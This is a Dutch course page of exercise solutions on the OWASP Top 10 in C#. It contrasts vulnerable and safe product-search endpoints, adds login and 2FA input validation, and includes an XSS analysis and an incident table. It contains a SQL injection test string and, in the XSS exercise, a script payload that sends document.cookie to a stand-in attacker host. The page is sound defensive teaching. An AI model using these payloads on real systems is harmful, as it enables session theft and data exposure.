---
title: "Les 9: Secure Coding — OWASP Top 10 — Oefeningen"
sidebar_label: "Oefeningen"
---

# Les 9: Secure Coding — OWASP Top 10 — Oefeningen

> **Code-afspraken:** geen top-level statements · altijd `{}` · max één `return` · geen `break`/`continue` · geen underscore-prefix op parameters · geen geneste klassen · geen ternary/null-conditional · geen tuples · `double` i.p.v. `decimal` · identifiers Engels · tekst Nederlands

---

## Oefening 1 — SQL Injection op productnaam

**Opgave:** Schrijf een kwetsbare en een veilige versie van een zoekendpoint op productnaam. Test de aanval `?product=' OR '1'='1` op de kwetsbare versie (alle orders worden zichtbaar). Verifieer dat de veilige versie het blokkeert.

**Kwetsbare versie (enkel voor demonstratie — nooit in productie)**

```csharp
app.MapGet("/orders/zoek-kwetsbaar", HandleZoekKwetsbaar);

IResult HandleZoekKwetsbaar(string product)
{
    // KWETSBAAR: input direct in querylogica
    string query = $"SELECT * FROM orders WHERE product = '{product}'";
    Console.WriteLine($"[KWETSBAAR] Query: {query}");

    List<string> resultaten = new List<string>();

    foreach (string order in orderDatabase)
    {
        if (order.Contains(product))
        {
            resultaten.Add(order);
        }
    }

    return Results.Ok(new { query = query, resultaten = resultaten });
}
```

**Veilige versie**

```csharp
app.MapGet("/orders/zoek-product", HandleZoekProduct);

IResult HandleZoekProduct(string product)
{
    // VEILIG: parameter staat los van de filterlogica
    Console.WriteLine($"[VEILIG] Zoeken op product: {product}");

    List<string> resultaten = new List<string>();

    foreach (string order in orderDatabase)
    {
        string[] delen    = order.Split('|');
        bool     gevonden = false;

        if (delen.Length >= 2)
        {
            gevonden = delen[1].Trim().Equals(product, StringComparison.OrdinalIgnoreCase);
        }

        if (gevonden)
        {
            resultaten.Add(order);
        }
    }

    return Results.Ok(new { resultaten = resultaten });
}
```

**Antwoorden op de vragen:**
1. `OR '1'='1` maakt de WHERE-voorwaarde altijd waar → alle rijen worden geselecteerd
2. `--` in SQL is een commentaarmarker → alles erna in de query wordt genegeerd
3. In de kwetsbare versie staat de parameter IN de querystructuur; in de veilige versie staat de parameter volledig los van de filterlogica
4. In echte SQL: gebruik `SqlCommand` met `cmd.Parameters.AddWithValue("@product", product)` — nooit string-interpolatie

---

## Oefening 2 — Input validatie voor /login en /verify

**Opgave:** Voeg server-side validatie toe aan `/login` (e-mail niet leeg, heeft `@`, wachtwoord niet leeg) en `/verify` (e-mail niet leeg, code = 6 tekens, code = enkel cijfers).

```csharp
app.MapPost("/login", HandleLogin);

IResult HandleLogin(LoginRequest request)
{
    bool emailLeeg       = string.IsNullOrWhiteSpace(request.Email);
    bool geenAtTeken     = !request.Email.Contains('@');
    bool wachtwoordLeeg  = string.IsNullOrWhiteSpace(request.Password);

    if (emailLeeg || geenAtTeken || wachtwoordLeeg)
    {
        return Results.BadRequest(new { fout = "Ongeldig e-mailadres of wachtwoord." });
    }

    string result = accountRepository.Login(request.Email, request.Password);

    return Results.Ok(new { status = result });
}

app.MapPost("/verify", HandleVerify);

IResult HandleVerify(VerifyRequest request)
{
    bool emailLeeg       = string.IsNullOrWhiteSpace(request.Email);
    bool codeOnjuist     = request.Code == null || request.Code.Length != 6;
    bool codeNietCijfers = false;

    if (!codeOnjuist)
    {
        foreach (char teken in request.Code)
        {
            if (!char.IsDigit(teken))
            {
                codeNietCijfers = true;
            }
        }
    }

    if (emailLeeg || codeOnjuist || codeNietCijfers)
    {
        return Results.BadRequest(new { fout = "Ongeldig e-mailadres of 2FA-code." });
    }

    string result = accountRepository.VerifyTwoFactor(request.Email, request.Code);

    if (result != "Inloggen geslaagd.")
    {
        return Results.Unauthorized();
    }

    string role  = DetermineRole(request.Email);
    string token = jwtTokenService.GenerateToken(request.Email, role);

    return Results.Ok(new { token = token });
}
```

---

## Oefening 3 — XSS in context begrijpen (analyse)

1. **`@Html.Raw(notitie.Text)` geeft script-injectie:** de browser voert de meegegeven JavaScript uit alsof die van de website komt.
2. **Kwaadaardige payload:** `<script>fetch('https://aanvaller.com/?c='+document.cookie)</script>` — stuurt sessie-cookies door naar de aanvaller.
3. **Impact:** elke medewerker die de pagina bezoekt, voert onbewust de kwaadaardige code uit. Sessie-tokens worden gestolen.
4. **Twee maatregelen:** (1) output encoding via de template engine (`@notitie.Text` in Razor, niet `@Html.Raw`); (2) een strenge Content-Security-Policy die inline scripts verbiedt.
5. **Beheerspaneel is gevaarlijker** omdat medewerkers hogere rechten hebben — een aanvaller die hun sessie steelt, krijgt ook die hogere rechten.

---

## Oefening 5 — OWASP-analyse van een reëel incident

| Bevinding                              | OWASP-kwetsbaarheid       | CIA                     | Maatregel                                  |
|----------------------------------------|---------------------------|-------------------------|--------------------------------------------|
| Alle orders via zoekendpoint opvraagbaar | A03 Injection / A01 Broken Access Control | Confidentiality | Parameterized queries + autorisatie per endpoint |
| `/swagger` toont `/admin/stats`        | A05 Security Misconfiguration | Confidentiality    | Swagger beperken tot development-omgeving  |
| JWT-sleutel in GitHub-commit          | A05 Security Misconfiguration | Confidentiality    | User Secrets / Key Vault; verwijder uit Git-geschiedenis |
| Databasestring leesbaar via `/crash`  | A05 Security Misconfiguration | Confidentiality    | Developer Exception Page enkel in development |